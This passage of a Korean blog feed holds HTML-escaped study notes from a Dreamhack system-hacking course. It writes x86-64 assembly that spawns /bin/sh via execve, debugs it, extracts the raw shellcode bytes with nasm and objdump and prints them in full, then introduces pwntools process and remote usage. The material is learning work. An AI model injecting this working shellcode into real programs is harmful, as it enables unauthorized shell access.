          &lt;td&gt;const char *const *envp&lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
    &lt;/table&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;linux execve manual&lt;/p&gt;

    &lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;    
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;execve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pathname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[],&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;envp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;ul&gt;
      &lt;li&gt;arg1: 실행할 프로그램의 path&lt;/li&gt;
      &lt;li&gt;arg2: 실행될 프로그램에게 인자로 넘겨질 스트링들의 시작 주소를 가리키는 포인터들의 배열&lt;/li&gt;
      &lt;li&gt;arg3: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;key=value&lt;/code&gt; 형식으로 실행될 프로그램에게 넘겨질 환경 변수.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;이번 실습에서는 sh만 실행하면 되기 때문에 arg2, arg3는 신경쓰지 않는다. 다만 arg2와 arg3를 무시하는 조건이 없기 때문에 arg2, arg3는 NULL로 채워 준다.&lt;/p&gt;

&lt;p&gt;위 코드를 실행할 수 있는 셸코드는 무엇일까? 한 번 작성해 보았다. ‘/bin/sh’ 문자열은 &lt;a href=&quot;https://toubva.github.io/blog/system-hacking-step3-2/#/&quot;&gt;직전 포스트에서&lt;/a&gt; 배웠던 pwntools의 unpacking 함수를 이용해 little endian의 hex로 변환했다.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-wasm&quot;&gt;push 0x68732f6e69622f ; 7byte이므로 immediate data로 사용 가능하다.
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov rax, 0x3b
syscall
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;이제 앞에서 진행했던 실습처럼 C 언어로 스켈레톤 코드를 만들고 그 안에 execve 실행 어셈블리 코드를 탑재해 컴파일 후 실행해 보자.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;__asm__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;.global run_sh&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;run_sh:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;

&lt;span class=&quot;s&quot;&gt;&quot;push 0x68732f6e69622f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;mov rdi, rsp&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;xor rsi, rsi&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;xor rdx, rdx&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;mov rax, 0x3b&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;syscall&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;

&lt;span class=&quot;s&quot;&gt;&quot;xor rdi, rdi&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;mov rax, 0x3c&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;syscall&quot;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;run_sh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;run_sh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;결과는 아래와 같았다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack4/Untitled%203.jpeg&quot; alt=&quot;거짓말처럼 에러가 떴다.&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;거짓말처럼 에러가 떴다.&lt;/p&gt;

&lt;p&gt;아니 대체… push에 들어갈 수 있는 operand type이 아니란다. 대체 왜인지 알아보았다. 그랬더니 충격적인 사실을 알게 되었다.&lt;/p&gt;

&lt;p&gt;push가 한 번 실행될 때 operand에 오는 값은 일반적으로 주소를 상정한다. 즉, 특정 값을 직접 넣는 게 아니라 특정 값의 포인터를 넣는 것이 push의 대전제였던 것이다. 그래서 immediate value를 스택에 넣는 것은 권장되지 않는 방식이었고, 어떤 값을 다른 메모리 주소나 레지스터에 넣어둔 후 스택에 데이터가 있는 위치를 push 하는 것이 convention이었다. 또한 현재 사용한 어셈블러에서 허용하는 push의 operand의 최대 길이는 32bit였다. (일반적인 어셈블러가 그렇기 때문에 이 점은 추측했다)&lt;/p&gt;

&lt;p&gt;궁금해서 데이터를 8bit씩 나누어 넣어 보았다. 그 결과, gdb를 통해 아래와 같은 실행 현황을 확인할 수 있었다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack4/Untitled%204.jpeg&quot; alt=&quot;ㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋ아놔&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋ아놔&lt;/p&gt;

&lt;p&gt;들어가긴 들어간다. 그렇지만 내가 의도하는 스트링으로 인식되지는 않는다!!!!!&lt;/p&gt;

&lt;p&gt;실제로 문자열의 시작 주소가 들어가게 만들어 둔 rdi의 값을 확인해 보니 아래와 같았다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack4/Untitled%205.jpeg&quot; alt=&quot;잘라서 인식한다!!!!!!!!!!!&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;잘라서 인식한다!!!!!!!!!!!&lt;/p&gt;

&lt;p&gt;잘라서 인식한다. 머리가 나쁘면 손발이 고생한다는 격언을 경험적으로 증명할 수 있었다.&lt;/p&gt;

&lt;p&gt;누군가가 하지 않는 데엔 이유가 있는 법임을 명심하자.&lt;/p&gt;

&lt;p&gt;따라서 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;push 0x68732f6e69622f\n&quot;&lt;/code&gt; 를 아래와 같이 변경하고 컴파일했다.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;&quot;mov rax, 0x68732f6e69622f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;push rax&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack4/Untitled%206.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;익스플로잇에 성공할 수 있었다. 아이기뻐.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;objdump를-이용한-shellcode-추출&quot;&gt;objdump를 이용한 shellcode 추출&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;어셈블리어로 작성한 셸코드를 byte code로 변환하는 과정이다.&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;nasm이라는 라이브러리를 설치해 진행할 수 있다.&lt;/p&gt;

    &lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;apt-get&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;install&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;nasm&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nasm&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;elf&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;execve.asm&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;objdump&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;execve.o&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;ul&gt;
      &lt;li&gt;
        &lt;p&gt;직전의 execve에 사용했던 셸코드를 독립적인 어셈블리 코드로 작성할 수 있게 수정해 execve.asm으로 저장했다.&lt;/p&gt;

        &lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack4/Untitled%207.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;위 커맨드를 실행한 결과(elf 형식의 오브젝트 코드로 변환된 대상 코드의 덤프를 뜬 결과):&lt;/p&gt;

        &lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack4/Untitled%208.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;이렇게 생성한 오브젝트 코드를 이제 정말로 바이트 코드로 바꿔주고, 해당 코드의 내용을 터미널에 표시한다.&lt;/p&gt;

        &lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;objcopy&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--dump-section&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;execve.bin&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;execve.o&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xxd&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;execve.bin&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;xxd:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;파일의&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;내용을&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;진수로&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;보여준다&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;

        &lt;p&gt;그 결과 아래와 같은 값을 확인할 수 있었고, 출력 내용의 포맷을 없애는 옵션을 달아 당장 복사해 사용할 수 있는 hex 값을 출력하도록 하기도 했다.&lt;/p&gt;

        &lt;p&gt;&lt;img src=&quot;/assets/img/posts/syshack4/Untitled%209.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

        &lt;p&gt;즉, execve.bin 쉘코드의 바이너리 값은&lt;/p&gt;

        &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;“\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x50\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\xb8\x3b\x00\x00\x00\x0f\x05\x48\x31\xff\xb8\x3c\x00\x00\x00\x0f\x05”&lt;/code&gt;&lt;/p&gt;

        &lt;p&gt;였다.&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;
</description>
        <pubDate>Wed, 20 Jul 2022 05:24:23 -0500</pubDate>
        <link>https://touBVa.github.io/blog/dreamhack_system_hacking/step4-1</link>
        <guid isPermaLink="true">https://touBVa.github.io/blog/dreamhack_system_hacking/step4-1</guid>
      </item>
    
      <item>
        <title>System Hackig Step 3-2</title>
        <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#stage-3-2&quot; id=&quot;markdown-toc-stage-3-2&quot;&gt;STAGE 3-2&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#tool-pwntools&quot; id=&quot;markdown-toc-tool-pwntools&quot;&gt;Tool: PwnTools&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#pwntools-api-사용법&quot; id=&quot;markdown-toc-pwntools-api-사용법&quot;&gt;PwnTools API 사용법&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#1-process--remote&quot; id=&quot;markdown-toc-1-process--remote&quot;&gt;1. process &amp;amp; remote&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#2-send&quot; id=&quot;markdown-toc-2-send&quot;&gt;2. send&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#3-recv&quot; id=&quot;markdown-toc-3-recv&quot;&gt;3. recv&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#4-packing--unpacking&quot; id=&quot;markdown-toc-4-packing--unpacking&quot;&gt;4. packing &amp;amp; unpacking&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#5-interactive&quot; id=&quot;markdown-toc-5-interactive&quot;&gt;5. interactive&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#6-elf&quot; id=&quot;markdown-toc-6-elf&quot;&gt;6. ELF&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#7-contextlog&quot; id=&quot;markdown-toc-7-contextlog&quot;&gt;7. context.log&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#8-contextarch&quot; id=&quot;markdown-toc-8-contextarch&quot;&gt;8. context.arch&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#9-shellcraft&quot; id=&quot;markdown-toc-9-shellcraft&quot;&gt;9. shellcraft&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#10-asm&quot; id=&quot;markdown-toc-10-asm&quot;&gt;10. asm&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#pwntools-실습&quot; id=&quot;markdown-toc-pwntools-실습&quot;&gt;pwntools 실습&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#get_shell-함수의-시작-주소-알아내기&quot; id=&quot;markdown-toc-get_shell-함수의-시작-주소-알아내기&quot;&gt;get_shell() 함수의 시작 주소 알아내기&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#유저-입력값을-받을-당시-스택의-구조-확인하기&quot; id=&quot;markdown-toc-유저-입력값을-받을-당시-스택의-구조-확인하기&quot;&gt;유저 입력값을 받을 당시 스택의 구조 확인하기&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#실제-스택의-구조를-디버거로-확인하기&quot; id=&quot;markdown-toc-실제-스택의-구조를-디버거로-확인하기&quot;&gt;실제 스택의 구조를 디버거로 확인하기&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#익스플로잇-작성하기&quot; id=&quot;markdown-toc-익스플로잇-작성하기&quot;&gt;익스플로잇 작성하기&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;stage-3-2&quot;&gt;STAGE 3-2&lt;/h1&gt;

&lt;h1 id=&quot;tool-pwntools&quot;&gt;Tool: PwnTools&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;파이썬을 이용해 익스플로잇을 수행할 때, 자주 사용하는 함수들이 있음. 예시) 리틀 엔디언 ↔ 빅 엔디언을 수행하는 함수&lt;/li&gt;
  &lt;li&gt;이런 함수들을 미리 구현해 둔 모듈을 만듦 → ‘pwntools’의 탄생&lt;/li&gt;
  &lt;li&gt;익스플로잇 대부분이 pwntools를 이용해 제작되고 공유되므로 반드시 알아 둬야 함.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;설치 방법은 생략한다. 인터넷에 검색하면 나오기 때문에…&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;pwntools-api-사용법&quot;&gt;PwnTools API 사용법&lt;/h1&gt;

&lt;p&gt;공식 매뉴얼: &lt;a href=&quot;http://docs.pwntools.com/en/latest/&quot;&gt;여기!&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;요즘은 매뉴얼화가 잘 되어 있기 때문에 어떤 모듈을 다운받으면 그 모듈의 매뉴얼부터 얼추 숙지해 두는 걸 추천한다. 보통은 영어로 되어 있으므로 파파고를 쓰거나, 영어 실력을 늘려서 언어 장벽을 낮추는 게 좋다.&lt;/p&gt;

&lt;p&gt;여기에서는 자주 사용되는 몇몇 함수만 간략히 소개한다.&lt;/p&gt;

&lt;h2 id=&quot;1-process--remote&quot;&gt;1. process &amp;amp; remote&lt;/h2&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;process&lt;/code&gt; 를 이용해 전달할 수 있는 함수는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;remote&lt;/code&gt; 를 통해서도 전달 및 실행할 수 있다!&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;process [&lt;a href=&quot;http://docs.pwntools.com/en/latest/tubes/processes.html&quot;&gt;자세한 설명&lt;/a&gt;]
    &lt;ul&gt;
      &lt;li&gt;로컬 바이너리를 대상으로 익스플로잇을 테스트하고 디버깅할 때 사용한다.&lt;/li&gt;
      &lt;li&gt;새로운 프로세스를 새 스레드에서 실행하면서, 커뮤니케이션이 가능한 튜브로 래핑해 둔다.&lt;/li&gt;
      &lt;li&gt;즉, process 함수가 실행된 원래 함수와는 별개의 스레드에서 원하는 프로세스를 실행하면서 원래 함수에서 전달하려는 인수나 실행된 프로세스의 결과 등을 주고받을 수 있게 해준다.&lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;사용예:&lt;/p&gt;

        &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;./test&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;print(&apos;this is a shellcode&apos;)&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.01&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;remote [&lt;a href=&quot;http://docs.pwntools.com/en/latest/tubes/sockets.html?highlight=remote#pwnlib.tubes.remote.remote&quot;&gt;자세한 설명&lt;/a&gt;]
    &lt;ul&gt;
      &lt;li&gt;원격 서버를 대상으로 익스플로잇을 실제로 실행할 때 사용한다.&lt;/li&gt;
      &lt;li&gt;TCP나 UDP 연결을 만들어서 통신하게 해 주고, IPv4와 IPc6를 모두 지원한다.&lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;사용예:&lt;/p&gt;

        &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; 
  &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;example.com&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;30909&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# &apos;example.com&apos;의 30909 포트에서 서비스 중인 프로세스를 대상으로 익스 수행
&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;GET /&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;2-send&quot;&gt;2. send&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;데이터를 프로세스에 전송하기 위해 사용한다.&lt;/li&gt;
  &lt;li&gt;여러 variation이 있고, 각자 상황에 맞게 사용할 수 있다. [&lt;a href=&quot;http://docs.pwntools.com/en/latest/tubes.html?highlight=send#pwnlib.tubes.tube.tube.send&quot;&gt;자세한 설명&lt;/a&gt;]&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;사용예:&lt;/p&gt;

    &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
